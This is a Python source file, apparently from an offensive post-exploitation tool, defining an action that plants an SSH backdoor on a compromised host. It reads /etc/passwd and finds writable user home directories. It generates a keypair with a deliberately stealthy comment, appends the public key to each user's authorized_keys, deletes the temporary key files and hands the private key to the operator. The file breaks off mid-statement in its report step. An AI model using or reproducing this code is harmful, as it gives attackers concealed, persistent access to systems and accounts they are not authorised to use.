from toboggan.core.action import BaseAction
from toboggan.core.utils import generate_fixed_length_token


class AutoSshBackdoorAction(BaseAction):
    DESCRIPTION = (
        "Generate an SSH key remotely and drop it into writable user .ssh directories."
    )

    def run(self) -> str:
        # Step 1: Locate ssh-keygen
        sshkeygen_path = self._executor.remote_execute("command -v ssh-keygen")
        if not sshkeygen_path or "not found" in sshkeygen_path.lower():
            return "❌ ssh-keygen not available on target."
        sshkeygen_path = sshkeygen_path.strip()
        self._logger.info(f"🔑 ssh-keygen found at: {sshkeygen_path}")

        # Step 2: Identify candidate users
        passwd_data = self._executor.remote_execute("cat /etc/passwd")
        if not passwd_data:
            return "❌ Could not read /etc/passwd."

        self._logger.info("🔍 Searching for writable user home directories...")

        candidate_users = []
        for line in passwd_data.strip().splitlines():
            parts = line.split(":")
            if len(parts) < 7:
                continue
            username, _, uid, _, _, home, _ = parts
            try:
                if int(uid) < 1000 or username in ["nobody", "sync"]:
                    continue
            except ValueError:
                continue

            test_write = self._executor.remote_execute(
                f"test -w {home} && echo OK || echo NO"
            )
            if test_write and "OK" in test_write:
                candidate_users.append((username, home))

        if not candidate_users:
            return "⚠️ No writable user home directories found."

        self._logger.info(
            f"👤 Found {len(candidate_users)} writable user home directories."
        )

        # Step 3: Generate random key filename and comment
        token = generate_fixed_length_token(6)
        key_path = f"/tmp/id_ed25519_{token}"
        comment = generate_fixed_length_token(12)  # stealthy random comment

        # Step 4: Generate SSH keypair
        gen_cmd = f"{sshkeygen_path} -t ed25519 -f {key_path} -N '' -C '{comment}' -q"
        self._executor.remote_execute(gen_cmd)

        self._logger.info(f"🔑 SSH keypair generated at: {key_path}")

        # Step 5: Read keys
        private_key = self._executor.remote_execute(f"cat {key_path}")
        public_key = self._executor.remote_execute(f"cat {key_path}.pub")
        if not private_key or not public_key:
            return "❌ Failed to read generated key pair."

        self._logger.info("🔑 SSH keypair read successfully.")

        # Step 6: Inject pubkey to each valid user's authorized_keys
        injected = []
        pubkey_escaped = public_key.strip().replace("'", "'\\''")

        for username, home in candidate_users:
            ssh_dir = f"{home}/.ssh"
            auth_keys = f"{ssh_dir}/authorized_keys"
            install_cmd = (
                f"mkdir -p {ssh_dir} && chmod 700 {ssh_dir} && "
                f"echo '{pubkey_escaped}' >> {auth_keys} && chmod 600 {auth_keys}"
            )
            result = self._executor.remote_execute(install_cmd)
            if result is None:
                injected.append((username, auth_keys))

        # Step 7: Clean up temporary keypair
        self._executor.remote_execute(f"rm -f {key_path} {key_path}.pub")

        if not injected:
            return "⚠️ No key could be injected despite writable home directories."

        # Step 8: Report
        output = "\n🔐 SSH public key installed for:\n"
        output += "-" * 60 + "\n"
        for username, path in injected:
            output += f"👤 {username:<15} → {path}\n"
        output += "-" * 60 + "\n"
        output += "\n🔑 Private Key (save this locally to connect):\n"
        output += "-"
